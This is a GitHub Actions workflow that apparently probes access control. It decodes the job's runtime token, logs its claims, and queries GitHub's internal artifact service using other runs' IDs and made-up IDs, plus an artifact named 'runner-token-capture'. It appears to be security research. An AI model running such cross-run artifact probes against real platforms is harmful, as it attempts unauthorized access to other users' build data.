name: Artifact Cross-Run Test
on: workflow_dispatch
permissions:
  contents: read
  actions: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
            
            console.log('=== Runtime Token Scope ===');
            console.log('scp:', jwt.scp);
            console.log('orch_id:', jwt.orch_id);
            console.log('run_id:', jwt.run_id);
            console.log('repository_id:', jwt.repository_id);
            
            const headers = { 
              'Authorization': `Bearer ${token}`, 
              'Content-Type': 'application/json' 
            };
            const artBase = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService`;
            
            // List OWN artifacts (should work)
            console.log('\n=== ListArtifacts - own run ===');
            const ownOrch = jwt.orch_id.split('.')[0];
            const r1 = await fetch(`${artBase}/ListArtifacts`, {
              method: 'POST', headers,
              body: JSON.stringify({
                workflow_run_backend_id: ownOrch,
                workflow_job_run_backend_id: jwt.job_id
              })
            });
            console.log(`Own: ${r1.status} ${(await r1.text()).substring(0,200)}`);
            
            // Try CROSS-RUN: use a different workflow's orch_id
            // Get a previous run's ID from the API
            console.log('\n=== ListArtifacts - cross run (different orch_id) ===');
            const runs = await github.rest.actions.listWorkflowRunsForRepo({
              owner: context.repo.owner, repo: context.repo.repo, per_page: 5
            });
            for (const run of runs.data.workflow_runs.slice(0, 3)) {
              if (run.id.toString() !== jwt.run_id) {
                const r = await fetch(`${artBase}/ListArtifacts`, {
                  method: 'POST', headers,
                  body: JSON.stringify({
                    workflow_run_backend_id: run.id.toString(),
                    workflow_job_run_backend_id: jwt.job_id
                  })
                });
                const t = await r.text();
                console.log(`Run ${run.id} (${run.name}): ${r.status} ${t.substring(0,150)}`);
              }
            }
            
            // Try with completely foreign IDs
            console.log('\n=== ListArtifacts - fabricated IDs ===');
            const r3 = await fetch(`${artBase}/ListArtifacts`, {
              method: 'POST', headers,
              body: JSON.stringify({
                workflow_run_backend_id: '00000000-0000-0000-0000-000000000001',
                workflow_job_run_backend_id: '00000000-0000-0000-0000-000000000001'
              })
            });
            console.log(`Fabricated: ${r3.status} ${(await r3.text()).substring(0,150)}`);
            
            // Try GetSignedArtifactURL for a known artifact from a different run
            console.log('\n=== GetSignedArtifactURL - cross run artifact ===');
            const r4 = await fetch(`${artBase}/GetSignedArtifactURL`, {
              method: 'POST', headers,
              body: JSON.stringify({
                name: 'runner-token-capture',
                workflow_run_backend_id: ownOrch,
                workflow_job_run_backend_id: jwt.job_id
              })
            });
            console.log(`Cross-run artifact: ${r4.status} ${(await r4.text()).substring(0,200)}`);
